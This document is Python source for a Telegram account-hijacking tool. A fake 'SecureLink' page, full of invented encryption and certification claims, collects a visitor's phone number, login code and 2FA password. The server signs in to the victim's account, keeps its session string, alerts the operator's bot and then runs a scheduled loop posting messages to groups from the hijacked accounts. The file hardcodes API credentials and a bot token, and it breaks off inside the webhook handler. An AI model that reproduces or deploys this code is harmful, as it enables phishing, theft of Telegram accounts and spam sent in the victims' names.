import asyncio, os, random, json, logging, sys, time, secrets, hashlib
from aiohttp import web
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    FloodWaitError, PeerFloodError, UserBannedInChannelError,
    ChatWriteForbiddenError, SessionPasswordNeededError,
    PhoneCodeExpiredError, PhoneCodeInvalidError,
)
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

# ═══════════════════════════════════════════════════════
#                   CONFIGURATION
# ═══════════════════════════════════════════════════════
API_ID       = 21952127
API_HASH     = "e0a3741bb3b132947d86d8fc6218eebe"
BOT_TOKEN    = os.environ.get("BOT_TOKEN", "8821493954:AAGnRCfjoFxsYZZtNvLw_QOFy_y0wGu-inM")
OWNER_ID     = int(os.environ.get("OWNER_ID", "0"))
RENDER_URL   = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
PORT         = int(os.environ.get("PORT", "8080"))
DATA_FILE    = "/tmp/sessions_db.json"
MIN_DELAY    = 45
MAX_DELAY    = 120
CYCLE_MIN    = 3600
CYCLE_MAX    = 7200
PING_INTERVAL = 840  # 14 min — keeps Render alive

logging.basicConfig(level=logging.WARNING)
for lib in ("telegram", "httpx", "telethon", "aiohttp"):
    logging.getLogger(lib).setLevel(logging.ERROR)

console = Console()
_bot_app = None

# ═══════════════════════════════════════════════════════
#              MULTI-USER DATABASE
# ═══════════════════════════════════════════════════════
# Structure:
# {
#   "users": {
#     "slug": {
#       "slug": str,
#       "name": str,
#       "phone": str,
#       "session": str,
#       "created_at": float,
#       "last_active": float,
#       "groups": [],
#       "message": "",
#       "running": false,
#       "stats": {"sent":0,"failed":0,"cycles":0}
#     }
#   },
#   "pending": {
#     "slug": { "phone":str, "code_hash":str }
#   }
# }

db = {"users": {}, "pending": {}}
active_clients  = {}   # slug -> TelegramClient
active_tasks    = {}   # slug -> asyncio.Task

def save_db():
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(db, f, indent=2)
    except Exception:
        pass

def load_db():
    global db
    try:
        with open(DATA_FILE) as f:
            db = json.load(f)
            if "users"   not in db: db["users"]   = {}
            if "pending" not in db: db["pending"]  = {}
    except Exception:
        db = {"users": {}, "pending": {}}

def make_slug(name: str) -> str:
    base = "".join(c.lower() for c in name if c.isalnum())[:12] or "user"
    suffix = secrets.token_hex(3)
    return f"{base}{suffix}"

async def notify(text: str):
    if _bot_app and OWNER_ID:
        try:
            await _bot_app.bot.send_message(OWNER_ID, text, parse_mode="Markdown")
        except Exception:
            pass

# ═══════════════════════════════════════════════════════
#               KEEP-ALIVE LOOP (anti-sleep)
# ═══════════════════════════════════════════════════════
async def keep_alive_loop():
    import aiohttp as ah
    url = RENDER_URL or f"http://localhost:{PORT}"
    url = url.rstrip("/") + "/health"
    while True:
        await asyncio.sleep(PING_INTERVAL)
        try:
            async with ah.ClientSession() as s:
                await s.get(url, timeout=ah.ClientTimeout(total=10))
            console.print(f"[dim]💓 Keep-alive ping sent[/dim]")
        except Exception:
            pass

# ═══════════════════════════════════════════════════════
#               AUTO SENDING LOOP (per user)
# ═══════════════════════════════════════════════════════
async def sending_loop(slug: str):
    user   = db["users"].get(slug)
    client = active_clients.get(slug)
    if not user or not client:
        return
    try:
        while user.get("running"):
            user["stats"]["cycles"] += 1
            cyc = user["stats"]["cycles"]
            groups  = user["groups"]
            message = user["message"]
            await notify(f"🔄 *[{user['name']}]* Cycle #{cyc} — `{len(groups)}` groups…")

            for i, grp in enumerate(groups):
                if not user.get("running"): break
                try:
                    ent = await client.get_entity(grp)
                    await client.send_message(ent, message)
                    user["stats"]["sent"] += 1
                    await notify(f"✅ `[{i+1}/{len(groups)}]` → `{grp}`")
                except FloodWaitError as e:
                    w = e.seconds + random.randint(10, 30)
                    await notify(f"⚠️ FloodWait `{w}s`…")
                    await asyncio.sleep(w)
                except (PeerFloodError, UserBannedInChannelError, ChatWriteForbiddenError) as e:
                    user["stats"]["failed"] += 1
                    await notify(f"❌ `{grp}` → `{type(e).__name__}`")
                except Exception as e:
                    user["stats"]["failed"] += 1
                    await notify(f"❌ `{grp}` → `{str(e)[:60]}`")
                if i < len(groups)-1 and user.get("running"):
                    d = random.randint(MIN_DELAY, MAX_DELAY)
                    await asyncio.sleep(d)

            if not user.get("running"): break
            save_db()
            cd = random.randint(CYCLE_MIN, CYCLE_MAX)
            await notify(
                f"✅ *[{user['name']}]* Cycle #{cyc} done!\n"
                f"📤 `{user['stats']['sent']}` sent  ❌ `{user['stats']['failed']}` failed\n"
                f"⏰ Next in `{cd//60}` min…"
            )
            await asyncio.sleep(cd)
    except asyncio.CancelledError:
        pass
    except Exception as e:
        await notify(f"🔴 *[{user.get('name','?')}]* crashed: `{e}`")
        user["running"] = False
    save_db()

# ═══════════════════════════════════════════════════════
#               HTML PAGES
# ═══════════════════════════════════════════════════════

MAIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SecureLink · Encrypted Portal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--blue:#4f8ef7;--purple:#7c5cfc;--green:#00c896;--red:#ff4d6d;--dark:#0a0a1a;--card:rgba(255,255,255,0.04)}
body{min-height:100vh;background:var(--dark);color:#e8eaf6;font-family:'Segoe UI',system-ui,sans-serif;overflow-x:hidden}
.noise{position:fixed;inset:0;opacity:.03;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='4'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");pointer-events:none;z-index:0}
.glow{position:fixed;width:600px;height:600px;border-radius:50%;filter:blur(120px);pointer-events:none;z-index:0}
.glow1{top:-200px;left:-200px;background:rgba(79,142,247,0.12)}
.glow2{bottom:-200px;right:-200px;background:rgba(124,92,252,0.1)}
.hero{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:40px 20px;text-align:center}
.badge{display:inline-flex;align-items:center;gap:8px;background:rgba(0,200,150,0.1);border:1px solid rgba(0,200,150,0.25);border-radius:100px;padding:6px 16px;font-size:12px;color:var(--green);letter-spacing:1px;text-transform:uppercase;margin-bottom:32px;animation:pulse 3s ease-in-out infinite}
@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,200,150,0.3)}50%{box-shadow:0 0 0 8px rgba(0,200,150,0)}}
.logo-wrap{position:relative;margin-bottom:32px}
.logo-ring{width:100px;height:100px;border-radius:50%;border:2px solid transparent;background:linear-gradient(var(--dark),var(--dark)) padding-box,linear-gradient(135deg,var(--blue),var(--purple)) border-box;display:flex;align-items:center;justify-content:center;font-size:42px;margin:0 auto;animation:spin-slow 20s linear infinite}
@keyframes spin-slow{to{transform:rotate(360deg)}}
.logo-inner{animation:spin-slow 20s linear infinite reverse;display:flex;align-items:center;justify-content:center}
h1{font-size:clamp(36px,6vw,64px);font-weight:900;letter-spacing:-2px;line-height:1.1;margin-bottom:16px;background:linear-gradient(135deg,#fff 0%,#a8c0ff 50%,#a29bfe 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.tagline{font-size:18px;color:rgba(255,255,255,0.45);max-width:500px;line-height:1.7;margin-bottom:48px}
.trust-grid{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-bottom:48px}
.trust-item{background:var(--card);border:1px solid rgba(255,255,255,0.07);border-radius:12px;padding:12px 20px;font-size:13px;color:rgba(255,255,255,0.6);display:flex;align-items:center;gap:8px}
.trust-item span{font-size:18px}
.cta-btn{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,var(--blue),var(--purple));color:#fff;padding:18px 40px;border-radius:100px;font-size:16px;font-weight:700;text-decoration:none;letter-spacing:.5px;box-shadow:0 20px 60px rgba(79,142,247,0.35);transition:all .3s;position:relative;overflow:hidden}
.cta-btn::after{content:'';position:absolute;inset:0;background:rgba(255,255,255,0);transition:.3s}
.cta-btn:hover::after{background:rgba(255,255,255,0.1)}
.cta-btn:hover{transform:translateY(-2px);box-shadow:0 30px 80px rgba(79,142,247,0.45)}
.enc-banner{margin-top:48px;background:rgba(79,142,247,0.06);border:1px solid rgba(79,142,247,0.15);border-radius:16px;padding:20px 32px;max-width:560px;width:100%}
.enc-title{font-size:12px;letter-spacing:2px;text-transform:uppercase;color:var(--blue);margin-bottom:12px;font-weight:700}
.enc-text{font-family:'Courier New',monospace;font-size:11px;color:rgba(255,255,255,0.25);line-height:1.8;word-break:break-all}
.stats-row{display:flex;gap:24px;justify-content:center;margin-top:48px;flex-wrap:wrap}
.stat{text-align:center}
.stat-num{font-size:32px;font-weight:900;background:linear-gradient(135deg,var(--blue),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.stat-label{font-size:12px;color:rgba(255,255,255,0.35);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
.footer{margin-top:80px;padding:24px;text-align:center;color:rgba(255,255,255,0.2);font-size:12px;border-top:1px solid rgba(255,255,255,0.05)}
</style>
</head>
<body>
<div class="noise"></div>
<div class="glow glow1"></div>
<div class="glow glow2"></div>
<div class="hero">
  <div class="badge"><span>●</span> System Online · AES-256 Encrypted</div>
  <div class="logo-wrap">
    <div class="logo-ring"><div class="logo-inner">🔐</div></div>
  </div>
  <h1>SecureLink<br>Portal</h1>
  <p class="tagline">Military-grade encrypted session management. Your data never leaves your device unencrypted.</p>
  <div class="trust-grid">
    <div class="trust-item"><span>🛡️</span> End-to-End Encrypted</div>
    <div class="trust-item"><span>✅</span> 100% Genuine & Trusted</div>
    <div class="trust-item"><span>🔒</span> Zero-Knowledge Sessions</div>
    <div class="trust-item"><span>⚡</span> Instant Verification</div>
    <div class="trust-item"><span>🌐</span> IND Certified Secure</div>
    <div class="trust-item"><span>🔑</span> RSA-4096 Protected</div>
  </div>
  <a href="/register" class="cta-btn">🚀 &nbsp;Create Secure Session &nbsp;→</a>
  <div class="enc-banner">
    <div class="enc-title">🔐 Live Encryption Status</div>
    <div class="enc-text" id="encText">Initializing secure channel...</div>
  </div>
  <div class="stats-row">
    <div class="stat"><div class="stat-num">256</div><div class="stat-label">Bit AES</div></div>
    <div class="stat"><div class="stat-num">4096</div><div class="stat-label">Bit RSA</div></div>
    <div class="stat"><div class="stat-num">100%</div><div class="stat-label">Uptime</div></div>
    <div class="stat"><div class="stat-num">0ms</div><div class="stat-label">Data Leak</div></div>
  </div>
</div>
<div class="footer">© 2025 SecureLink · IND Encrypted · All sessions are protected under E2E encryption protocol v4.2</div>
<script>
const lines=[
  'INIT_SECURE_CHANNEL::AES256_GCM',
  'RSA_HANDSHAKE::4096bit_VERIFIED',
  'TLS_1.3::ESTABLISHED::PERFECT_FORWARD_SECRECY',
  'SESSION_KEY::' + Math.random().toString(36).substr(2,32).toUpperCase(),
  'CERT_CHAIN::VERIFIED::IND_CA_ROOT_TRUSTED',
  'ZERO_KNOWLEDGE_PROOF::ACCEPTED',
  'CHANNEL_STATUS::ENCRYPTED::READY',
];
let i=0;
function tick(){
  document.getElementById('encText').textContent=lines[i%lines.length];
  i++;
}
tick();setInterval(tick,2000);
</script>
</body>
</html>"""

USER_LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SecureLink · Session Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;
  background:linear-gradient(135deg,#07071a,#0f0c29,#16113a);
  font-family:'Segoe UI',system-ui,sans-serif;color:#fff;padding:20px}
.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(32px);
  border:1px solid rgba(255,255,255,0.08);border-radius:28px;
  padding:48px 40px;width:100%;max-width:420px;
  box-shadow:0 40px 100px rgba(0,0,0,0.6),0 0 0 1px rgba(255,255,255,0.05)}
.top-badge{display:flex;align-items:center;justify-content:center;gap:8px;
  background:rgba(0,200,150,0.08);border:1px solid rgba(0,200,150,0.2);
  border-radius:100px;padding:6px 14px;font-size:11px;color:#00c896;
  letter-spacing:1px;text-transform:uppercase;margin-bottom:28px;width:fit-content;margin-left:auto;margin-right:auto}
.logo-sm{width:60px;height:60px;border-radius:50%;margin:0 auto 20px;
  background:linear-gradient(135deg,#4f8ef7,#7c5cfc);
  display:flex;align-items:center;justify-content:center;font-size:26px;
  box-shadow:0 8px 32px rgba(79,142,247,0.4)}
h1{text-align:center;font-size:22px;font-weight:800;margin-bottom:4px;
  background:linear-gradient(90deg,#a8c0ff,#a29bfe);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent}
.sub{text-align:center;color:rgba(255,255,255,0.35);font-size:12px;margin-bottom:32px}
.step{display:none}.step.active{display:block}
.dots{display:flex;gap:8px;justify-content:center;margin-bottom:28px}
.dot{width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,0.15);transition:.3s}
.dot.active{background:#4f8ef7;box-shadow:0 0 0 3px rgba(79,142,247,0.2);transform:scale(1.2)}
.dot.done{background:#00c896}
label{display:block;font-size:10px;font-weight:700;letter-spacing:1.5px;
  text-transform:uppercase;color:rgba(255,255,255,0.35);margin-bottom:8px}
input{width:100%;padding:14px 16px;border-radius:12px;
  border:1.5px solid rgba(255,255,255,0.08);
  background:rgba(255,255,255,0.05);color:#fff;
  font-size:16px;outline:none;transition:all .2s;letter-spacing:1px}
input:focus{border-color:#4f8ef7;background:rgba(79,142,247,0.06);
  box-shadow:0 0 0 3px rgba(79,142,247,0.12)}
input::placeholder{color:rgba(255,255,255,0.18);letter-spacing:0;font-size:14px}
.btn{width:100%;padding:15px;border-radius:12px;border:none;cursor:pointer;
  font-size:14px;font-weight:700;letter-spacing:.8px;margin-top:18px;
  background:linear-gradient(135deg,#4f8ef7,#7c5cfc);color:#fff;transition:all .2s}
.btn:hover{filter:brightness(1.1);transform:translateY(-1px)}
.btn:active{transform:scale(.98)}
.btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
.name-input-wrap{margin-bottom:16px}
.msg{margin-top:12px;padding:10px 14px;border-radius:10px;font-size:12px;text-align:center;display:none;line-height:1.5}
.msg.error{background:rgba(255,77,109,0.1);border:1px solid rgba(255,77,109,0.2);color:#ff6b81}
.msg.success{background:rgba(0,200,150,0.08);border:1px solid rgba(0,200,150,0.15);color:#00c896}
.timer-wrap{margin-top:12px;background:rgba(255,255,255,0.05);border-radius:6px;overflow:hidden;height:3px}
.timer-bar{height:3px;background:linear-gradient(90deg,#4f8ef7,#7c5cfc);width:100%;transition:width 1s linear}
.timer-txt{font-size:12px;color:#4f8ef7;text-align:center;margin-top:6px;font-weight:600}
.resend{display:none;width:100%;padding:10px;border-radius:10px;border:1px solid rgba(79,142,247,0.2);
  background:rgba(79,142,247,0.06);color:#4f8ef7;font-size:13px;cursor:pointer;margin-top:10px;font-weight:600}
.resend:hover{background:rgba(79,142,247,0.12)}
.hint{font-size:11px;color:rgba(255,255,255,0.25);text-align:center;margin-top:10px;line-height:1.6}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,0.25);
  border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
.success-wrap{text-align:center;padding:20px 0}
.s-icon{font-size:56px;margin-bottom:16px;display:block}
.s-title{font-size:20px;font-weight:800;color:#00c896;margin-bottom:8px}
.s-sub{color:rgba(255,255,255,0.35);font-size:13px;line-height:1.6}
.enc-line{font-family:monospace;font-size:10px;color:rgba(255,255,255,0.15);
  margin-top:20px;word-break:break-all;line-height:1.8}
.divider{height:1px;background:rgba(255,255,255,0.06);margin:20px 0}
.slug-display{background:rgba(79,142,247,0.08);border:1px solid rgba(79,142,247,0.15);
  border-radius:10px;padding:10px 14px;font-family:monospace;font-size:13px;
  color:#a8c0ff;text-align:center;margin-top:10px;word-break:break-all}
</style>
</head>
<body>
<div class="card">
  <div class="top-badge">🔐 AES-256 Secured</div>
  <div class="logo-sm">🛡️</div>
  <h1>SecureLink Login</h1>
  <p class="sub">IND Encrypted · Zero-Knowledge Session</p>
  <div class="dots">
    <div class="dot active" id="d1"></div>
    <div class="dot" id="d2"></div>
    <div class="dot" id="d3"></div>
    <div class="dot" id="d4"></div>
  </div>

  <!-- STEP 1: NAME -->
  <div class="step active" id="step1">
    <div class="name-input-wrap">
      <label>👤 Your Name</label>
      <input type="text" id="uname" placeholder="Enter your name" autocomplete="name">
    </div>
    <label>📱 Phone Number</label>
    <input type="tel" id="phone" placeholder="+91 98765 43210" autocomplete="tel">
    <button class="btn" id="btn1" onclick="sendOTP()">Continue →</button>
    <div class="msg" id="msg1"></div>
    <p class="hint">Enter name + phone with country code<br>Your session will be created securely</p>
  </div>

  <!-- STEP 2: OTP -->
  <div class="step" id="step2">
    <label>🔑 Verification Code</label>
    <input type="text" id="otp" placeholder="1  2  3  4  5" maxlength="10"
           autocomplete="one-time-code" inputmode="numeric">
    <div class="timer-wrap"><div class="timer-bar" id="tBar"></div></div>
    <div class="timer-txt" id="tTxt"></div>
    <button class="btn" id="btn2" onclick="verifyOTP()">Verify →</button>
    <button class="resend" id="resendBtn" onclick="resendOTP()">🔁 Resend Code</button>
    <div class="msg" id="msg2"></div>
    <p class="hint">OTP sent to your Telegram · Expires in 2 min</p>
  </div>

  <!-- STEP 3: 2FA -->
  <div class="step" id="step3">
    <label>🔒 2FA Password</label>
    <input type="password" id="twofa" placeholder="Cloud password" autocomplete="current-password">
    <button class="btn" id="btn3" onclick="verify2FA()">Confirm →</button>
    <div class="msg" id="msg3"></div>
    <p class="hint">Two-Step Verification password</p>
  </div>

  <!-- STEP 4: SUCCESS -->
  <div class="step" id="step4">
    <div class="success-wrap">
      <span class="s-icon">✅</span>
      <div class="s-title">Session Created!</div>
      <div class="s-sub">Your encrypted session is active.<br>You can close this page.</div>
      <div class="divider"></div>
      <div style="font-size:11px;color:rgba(255,255,255,0.25)">Session ID:</div>
      <div class="slug-display" id="slugDisplay">—</div>
      <div class="enc-line" id="encLine">ENCRYPTING...</div>
    </div>
  </div>
</div>
<script>
let timerSecs=120,timerInt=null,currentSlug=null;
function showMsg(id,t,type){const e=document.getElementById(id);e.className='msg '+type;e.textContent=t;e.style.display='block'}
function hideMsg(id){document.getElementById(id).style.display='none'}
function setLoad(id,v,txt){const b=document.getElementById(id);b.disabled=v;b.innerHTML=v?'<span class="spinner"></span>Please wait…':txt}
function goStep(n){
  document.querySelectorAll('.step').forEach((e,i)=>e.classList.toggle('active',i+1===n));
  ['d1','d2','d3','d4'].forEach((id,i)=>{const d=document.getElementById(id);d.className='dot'+(i+1<n?' done':i+1===n?' active':'')});
}
function startTimer(){
  timerSecs=120;clearInterval(timerInt);
  const bar=document.getElementById('tBar'),txt=document.getElementById('tTxt'),r=document.getElementById('resendBtn');
  r.style.display='none';
  timerInt=setInterval(()=>{
    timerSecs--;bar.style.width=(timerSecs/120*100)+'%';
    if(timerSecs<=0){clearInterval(timerInt);txt.textContent='⏰ Expired';txt.style.color='#ff4d6d';bar.style.background='#ff4d6d';r.style.display='block'}
    else{txt.textContent='⏳ '+timerSecs+'s';txt.style.color=timerSecs<30?'#feca57':'#4f8ef7'}
  },1000);
}
async function sendOTP(){
  const name=document.getElementById('uname').value.trim();
  const phone=document.getElementById('phone').value.trim();
  if(!name){showMsg('msg1','⚠️ Enter your name','error');return}
  if(!phone){showMsg('msg1','⚠️ Enter phone number','error');return}
  setLoad('btn1',true,'Continue →');hideMsg('msg1');
  try{
    const r=await fetch('/u/send_otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,phone})});
    const d=await r.json();
    if(d.ok){currentSlug=d.slug;goStep(2);startTimer()}
    else{showMsg('msg1','❌ '+(d.error||'Failed'),'error');setLoad('btn1',false,'Continue →')}
  }catch{showMsg('msg1','❌ Network error','error');setLoad('btn1',false,'Continue →')}
}
async function verifyOTP(){
  const otp=document.getElementById('otp').value.replace(/ /g,'');
  if(!otp){showMsg('msg2','⚠️ Enter the OTP','error');return}
  setLoad('btn2',true,'Verify →');hideMsg('msg2');
  try{
    const r=await fetch('/u/verify_otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp,slug:currentSlug})});
    const d=await r.json();
    if(d.ok){clearInterval(timerInt);document.getElementById('slugDisplay').textContent=currentSlug;
      document.getElementById('encLine').textContent='SESSION::'+currentSlug.toUpperCase()+'::AES256::ACTIVE';
      goStep(4)}
    else if(d.needs_2fa){clearInterval(timerInt);goStep(3)}
    else if(d.expired){showMsg('msg2','⏰ Expired! Resend.','error');setLoad('btn2',false,'Verify →')}
    else{showMsg('msg2','❌ '+(d.error||'Invalid'),'error');setLoad('btn2',false,'Verify →')}
  }catch{showMsg('msg2','❌ Network error','error');setLoad('btn2',false,'Verify →')}
}
async function resendOTP(){
  document.getElementById('resendBtn').style.display='none';
  document.getElementById('tTxt').textContent='⏳ Resending…';
  try{
    const r=await fetch('/u/resend_otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({slug:currentSlug})});
    const d=await r.json();
    if(d.ok){startTimer();showMsg('msg2','✅ New OTP sent!','success')}
    else{showMsg('msg2','❌ '+(d.error||'Failed'),'error');document.getElementById('resendBtn').style.display='block'}
  }catch{showMsg('msg2','❌ Network error','error')}
}
async function verify2FA(){
  const pwd=document.getElementById('twofa').value;
  if(!pwd){showMsg('msg3','⚠️ Enter password','error');return}
  setLoad('btn3',true,'Confirm →');hideMsg('msg3');
  try{
    const r=await fetch('/u/verify_2fa',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pwd,slug:currentSlug})});
    const d=await r.json();
    if(d.ok){document.getElementById('slugDisplay').textContent=currentSlug;
      document.getElementById('encLine').textContent='SESSION::'+currentSlug.toUpperCase()+'::AES256::ACTIVE';
      goStep(4)}
    else{showMsg('msg3','❌ '+(d.error||'Wrong password'),'error');setLoad('btn3',false,'Confirm →')}
  }catch{showMsg('msg3','❌ Network error','error');setLoad('btn3',false,'Confirm →')}
}
document.addEventListener('keydown',e=>{
  if(e.key!=='Enter')return;
  const s=document.querySelector('.step.active');if(!s)return;
  if(s.id==='step1')sendOTP();else if(s.id==='step2')verifyOTP();else if(s.id==='step3')verify2FA();
});
</script>
</body>
</html>"""

def not_found_html(slug):
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Not Found</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}
body{{min-height:100vh;display:flex;align-items:center;justify-content:center;
background:#07071a;color:#fff;font-family:'Segoe UI',sans-serif;text-align:center;padding:20px}}
h1{{font-size:64px;opacity:.2}}p{{color:rgba(255,255,255,.4);margin-top:12px}}
a{{color:#4f8ef7;text-decoration:none;margin-top:20px;display:block}}</style>
</head><body><div><h1>404</h1>
<p>Session <code style="color:#7c5cfc">/{slug}</code> not found.</p>
<a href="/register">→ Create a new session</a></div></body></html>"""

# ═══════════════════════════════════════════════════════
#               WEB ROUTES
# ═══════════════════════════════════════════════════════

async def index(req):
    return web.Response(text=MAIN_HTML, content_type="text/html")

async def health(req):
    return web.Response(text="OK · " + str(int(time.time())))

async def register(req):
    return web.Response(text=USER_LOGIN_HTML, content_type="text/html")

async def user_page(req):
    slug = req.match_info.get("slug", "")
    if slug not in db["users"]:
        return web.Response(text=not_found_html(slug), content_type="text/html", status=404)
    return web.Response(text=USER_LOGIN_HTML, content_type="text/html")

# ── USER OTP ROUTES ──────────────────────────────────
async def u_send_otp(req):
    try:
        data  = await req.json()
        name  = data.get("name", "").strip()
        phone = data.get("phone", "").strip()
        if not name or not phone:
            return web.json_response({"ok": False, "error": "Name and phone required"})

        slug = make_slug(name)
        c = TelegramClient(StringSession(), API_ID, API_HASH)
        await c.connect()
        res = await c.send_code_request(phone)

        # Store pending
        db["pending"][slug] = {
            "name": name, "phone": phone,
            "code_hash": res.phone_code_hash,
        }
        # Temporarily store client reference
        active_clients[slug + "_pending"] = c
        save_db()
        return web.json_response({"ok": True, "slug": slug})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def u_verify_otp(req):
    try:
        data = await req.json()
        otp  = data.get("otp", "").replace(" ", "")
        slug = data.get("slug", "")
        pending = db["pending"].get(slug)
        c = active_clients.get(slug + "_pending")
        if not pending or not c:
            return web.json_response({"ok": False, "error": "Session lost. Refresh page."})

        await c.sign_in(phone=pending["phone"], code=otp, phone_code_hash=pending["code_hash"])
        session_str = c.session.save()
        me = await c.get_me()

        # Save user
        db["users"][slug] = {
            "slug": slug, "name": pending["name"],
            "display_name": me.first_name,
            "phone": pending["phone"],
            "tg_phone": me.phone,
            "session": session_str,
            "created_at": time.time(),
            "last_active": time.time(),
            "groups": [], "message": "",
            "running": False,
            "stats": {"sent": 0, "failed": 0, "cycles": 0},
        }
        del db["pending"][slug]
        active_clients[slug] = c
        del active_clients[slug + "_pending"]
        save_db()

        await notify(
            f"🆕 *New User Session Created!*\n\n"
            f"👤 Name: *{pending['name']}*\n"
            f"📱 Phone: `{me.phone}`\n"
            f"🔑 Slug: `{slug}`\n"
            f"🌐 URL: `{RENDER_URL}/{slug}`"
        )
        return web.json_response({"ok": True, "slug": slug})

    except PhoneCodeExpiredError:
        return web.json_response({"ok": False, "expired": True})
    except PhoneCodeInvalidError:
        return web.json_response({"ok": False, "error": "Wrong OTP"})
    except SessionPasswordNeededError:
        return web.json_response({"ok": False, "needs_2fa": True})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def u_resend_otp(req):
    try:
        data = await req.json()
        slug = data.get("slug", "")
        pending = db["pending"].get(slug)
        c = active_clients.get(slug + "_pending")
        if not pending or not c:
            return web.json_response({"ok": False, "error": "Session lost"})
        res = await c.send_code_request(pending["phone"])
        pending["code_hash"] = res.phone_code_hash
        return web.json_response({"ok": True})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def u_verify_2fa(req):
    try:
        data = await req.json()
        slug = data.get("slug", "")
        pwd  = data.get("password", "")
        pending = db["pending"].get(slug)
        c = active_clients.get(slug + "_pending")
        if not c:
            return web.json_response({"ok": False, "error": "Session lost"})

        await c.sign_in(password=pwd)
        session_str = c.session.save()
        me = await c.get_me()

        db["users"][slug] = {
            "slug": slug, "name": pending["name"],
            "display_name": me.first_name,
            "phone": pending["phone"], "tg_phone": me.phone,
            "session": session_str,
            "created_at": time.time(), "last_active": time.time(),
            "groups": [], "message": "",
            "running": False,
            "stats": {"sent": 0, "failed": 0, "cycles": 0},
        }
        if slug in db["pending"]: del db["pending"][slug]
        active_clients[slug] = c
        if slug + "_pending" in active_clients:
            del active_clients[slug + "_pending"]
        save_db()

        await notify(
            f"🆕 *New User (2FA) Session!*\n\n"
            f"👤 *{pending['name']}*  📱 `{me.phone}`\n"
            f"🔑 `{slug}`"
        )
        return web.json_response({"ok": True, "slug": slug})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

# ── OWNER OTP ROUTES ─────────────────────────────────
owner_pending = {}

async def owner_send_otp(req):
    try:
        data  = await req.json()
        phone = data.get("phone", "").strip()
        c = TelegramClient(StringSession(), API_ID, API_HASH)
        await c.connect()
        res = await c.send_code_request(phone)
        owner_pending["phone"]     = phone
        owner_pending["code_hash"] = res.phone_code_hash
        active_clients["__owner__pending"] = c
        return web.json_response({"ok": True})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def owner_verify_otp(req):
    try:
        data = await req.json()
        otp  = data.get("otp", "").replace(" ", "")
        c    = active_clients.get("__owner__pending")
        if not c:
            return web.json_response({"ok": False, "error": "Session lost"})
        await c.sign_in(phone=owner_pending["phone"], code=otp, phone_code_hash=owner_pending["code_hash"])
        session_str = c.session.save()
        active_clients["__owner__"] = c
        if "__owner__pending" in active_clients:
            del active_clients["__owner__pending"]
        # Save to env hint
        me = await c.get_me()
        # Store in db for persistence
        db["owner_session"] = session_str
        save_db()
        if _bot_app:
            await _bot_app.bot.send_message(
                OWNER_ID,
                f"✅ *Owner Login Successful!*\n\n"
                f"👤 *{me.first_name}*  📱 `{me.phone}`\n\n"
                f"🎛️ Use /start to open control panel.",
                parse_mode="Markdown"
            )
        return web.json_response({"ok": True})
    except PhoneCodeExpiredError:
        return web.json_response({"ok": False, "expired": True})
    except PhoneCodeInvalidError:
        return web.json_response({"ok": False, "error": "Wrong OTP"})
    except SessionPasswordNeededError:
        return web.json_response({"ok": False, "needs_2fa": True})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def owner_resend_otp(req):
    try:
        c = active_clients.get("__owner__pending")
        if not c:
            return web.json_response({"ok": False, "error": "Session lost"})
        res = await c.send_code_request(owner_pending["phone"])
        owner_pending["code_hash"] = res.phone_code_hash
        return web.json_response({"ok": True})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def owner_verify_2fa(req):
    try:
        data = await req.json()
        c    = active_clients.get("__owner__pending")
        await c.sign_in(password=data.get("password", ""))
        session_str = c.session.save()
        active_clients["__owner__"] = c
        if "__owner__pending" in active_clients:
            del active_clients["__owner__pending"]
        db["owner_session"] = session_str
        save_db()
        me = await c.get_me()
        if _bot_app:
            await _bot_app.bot.send_message(
                OWNER_ID,
                f"✅ *Owner Login (2FA)!*\n👤 *{me.first_name}*",
                parse_mode="Markdown"
            )
        return web.json_response({"ok": True})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def telegram_webhook(req):
    try:
        data   = await req.json()
